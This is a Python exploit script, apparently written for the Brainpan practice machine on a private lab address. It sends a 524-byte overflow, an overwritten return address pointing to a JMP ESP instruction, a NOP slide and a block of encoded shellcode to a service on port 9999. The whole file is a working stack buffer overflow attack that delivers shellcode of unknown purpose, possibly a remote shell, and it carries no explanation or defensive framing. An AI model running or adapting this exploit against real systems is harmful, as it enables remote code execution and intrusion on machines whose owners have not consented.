import socket
import sys
from termcolor import colored

HOST = "192.168.56.101"
PORT = 9999 

offset = b"A" * 524
EIP = b"\xf3\x12\x17\x31" #0x311712F3 bianpan JMP ESP address
SLIDE = b"\x90" * 10
buf =  b""
buf += b"\xbd\xbe\xb4\xf7\x26\xda\xd0\xd9\x74\x24\xf4\x5a\x31"
buf += b"\xc9\xb1\x52\x31\x6a\x12\x03\x6a\x12\x83\x7c\xb0\x15"
buf += b"\xd3\x7c\x51\x5b\x1c\x7c\xa2\x3c\x94\x99\x93\x7c\xc2"
buf += b"\xea\x84\x4c\x80\xbe\x28\x26\xc4\x2a\xba\x4a\xc1\x5d"
buf += b"\x0b\xe0\x37\x50\x8c\x59\x0b\xf3\x0e\xa0\x58\xd3\x2f"
buf += b"\x6b\xad\x12\x77\x96\x5c\x46\x20\xdc\xf3\x76\x45\xa8"
buf += b"\xcf\xfd\x15\x3c\x48\xe2\xee\x3f\x79\xb5\x65\x66\x59"
buf += b"\x34\xa9\x12\xd0\x2e\xae\x1f\xaa\xc5\x04\xeb\x2d\x0f"
buf += b"\x55\x14\x81\x6e\x59\xe7\xdb\xb7\x5e\x18\xae\xc1\x9c"
buf += b"\xa5\xa9\x16\xde\x71\x3f\x8c\x78\xf1\xe7\x68\x78\xd6"
buf += b"\x7e\xfb\x76\x93\xf5\xa3\x9a\x22\xd9\xd8\xa7\xaf\xdc"
buf += b"\x0e\x2e\xeb\xfa\x8a\x6a\xaf\x63\x8b\xd6\x1e\x9b\xcb"
buf += b"\xb8\xff\x39\x80\x55\xeb\x33\xcb\x31\xd8\x79\xf3\xc1"
buf += b"\x76\x09\x80\xf3\xd9\xa1\x0e\xb8\x92\x6f\xc9\xbf\x88"
buf += b"\xc8\x45\x3e\x33\x29\x4c\x85\x67\x79\xe6\x2c\x08\x12"
buf += b"\xf6\xd1\xdd\xb5\xa6\x7d\x8e\x75\x16\x3e\x7e\x1e\x7c"
buf += b"\xb1\xa1\x3e\x7f\x1b\xca\xd5\x7a\xcc\x35\x81\xbc\x6a"
buf += b"\xde\xd0\xbc\x68\x15\x5c\x5a\xe6\x39\x08\xf5\x9f\xa0"
buf += b"\x11\x8d\x3e\x2c\x8c\xe8\x01\xa6\x23\x0d\xcf\x4f\x49"
buf += b"\x1d\xb8\xbf\x04\x7f\x6f\xbf\xb2\x17\xf3\x52\x59\xe7"
buf += b"\x7a\x4f\xf6\xb0\x2b\xa1\x0f\x54\xc6\x98\xb9\x4a\x1b"
buf += b"\x7c\x81\xce\xc0\xbd\x0c\xcf\x85\xfa\x2a\xdf\x53\x02"
buf += b"\x77\x8b\x0b\x55\x21\x65\xea\x0f\x83\xdf\xa4\xfc\x4d"
buf += b"\xb7\x31\xcf\x4d\xc1\x3d\x1a\x38\x2d\x8f\xf3\x7d\x52"
buf += b"\x20\x94\x89\x2b\x5c\x04\x75\xe6\xe4\x34\x3c\xaa\x4d"
buf += b"\xdd\x99\x3f\xcc\x80\x19\xea\x13\xbd\x99\x1e\xec\x3a"
buf += b"\x81\x6b\xe9\x07\x05\x80\x83\x18\xe0\xa6\x30\x18\x21"


payload = offset + EIP + SLIDE + buf

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    print(colored("[+] Trying to connect ...","yellow"))
    s.connect((HOST,PORT))

except:
    print(colored("[!] Connection error to IP:{}, port:{}", "red").format(HOST,PORT))
    print(colored("[!] Exitting...", "red"))
    sys.exit(0)

print(colored("[+] Connection successful!","yellow"))

s.recv(1024)

s.send(payload)

print(colored("[+] Sending buffer...","yellow"))
s.recv(1024)
